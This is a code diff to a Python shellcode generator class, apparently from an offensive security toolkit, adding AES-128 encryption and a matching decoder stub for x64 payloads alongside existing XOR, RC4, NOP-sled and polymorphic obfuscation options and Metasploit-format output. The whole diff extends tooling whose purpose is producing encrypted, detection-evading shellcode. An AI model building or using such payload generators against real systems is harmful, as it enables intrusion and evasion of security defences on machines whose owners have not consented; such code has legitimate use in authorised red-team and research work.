@@ -22,6 +22,7 @@ class ShellcodeGenerator:
         self.encryption_methods = ['xor', 'aes', 'rc4', 'custom']
         self.obfuscation_methods = ['nopsled', 'garbage', 'junk', 'polymorphic']
         self.shellcode_templates = self._load_shellcode_templates()
+        self._last_aes_package = None
     
     def generate_shellcode(self, 
                           shellcode_type: str = "execve",
@@ -45,6 +46,9 @@ class ShellcodeGenerator:
         try:
             print_info(f"Generating {shellcode_type} shellcode for {architecture}")
             custom_params = self._normalize_params(custom_params)
+            self._last_aes_package = None
+            if encryption == "aes" and architecture != "x64":
+                raise ValueError("AES shellcode encryption is only supported for x64")
 
             # Generate base shellcode
             base_shellcode = self._generate_base_shellcode(shellcode_type, architecture, custom_params)
@@ -77,10 +81,16 @@ class ShellcodeGenerator:
                 'python_bytes': self._generate_python_bytes(final_payload),
                 'metasploit_format': self._generate_metasploit_format(final_payload)
             }
+            if self._last_aes_package is not None:
+                result['aes_key'] = self._last_aes_package.key.hex()
+                result['aes_original_length'] = self._last_aes_package.original_length
+                result['aes_requires_aesni'] = True
             
             print_success(f"Shellcode generated: {len(final_payload)} bytes")
             return result
             
+        except ValueError:
+            raise
         except Exception as e:
             print_error(f"Shellcode generation failed: {e}")
             return {}
@@ -342,7 +352,11 @@ class ShellcodeGenerator:
         return bytes([key]) + bytes(encrypted)
     
     def _aes_encrypt(self, shellcode: bytes) -> bytes:
-        raise ValueError("AES executable decoder is not implemented")
+        from core.lib.shellcode_aes import encode_shellcode_aes128_x64
+
+        package = encode_shellcode_aes128_x64(shellcode)
+        self._last_aes_package = package
+        return package.ciphertext
 
     def _rc4_crypt(self, data: bytes, key: bytes) -> bytes:
         S = list(range(256))
@@ -453,17 +467,20 @@ class ShellcodeGenerator:
         return bytes(decoder)
     
     def _generate_aes_decoder(self) -> bytes:
-        raise ValueError("AES executable decoder is not implemented")
+        if self._last_aes_package is None:
+            raise ValueError("AES decoder requested without a prepared AES payload")
+        return self._last_aes_package.decoder
     
     def _generate_rc4_decoder(self) -> bytes:
         raise ValueError("RC4 executable decoder is not implemented")
     
     def _create_final_payload(self, decoder: bytes, shellcode: bytes) -> bytes:
-        """Create final payload with decoder and shellcode"""
+        """Create final payload with decoder and shellcode."""
+        if self._last_aes_package is not None:
+            return self._last_aes_package.assemble()
         if decoder:
             return decoder + shellcode
-        else:
-            return shellcode
+        return shellcode
     
     def _encode_payload(self, payload: bytes) -> str:
         """Encode payload in various formats"""
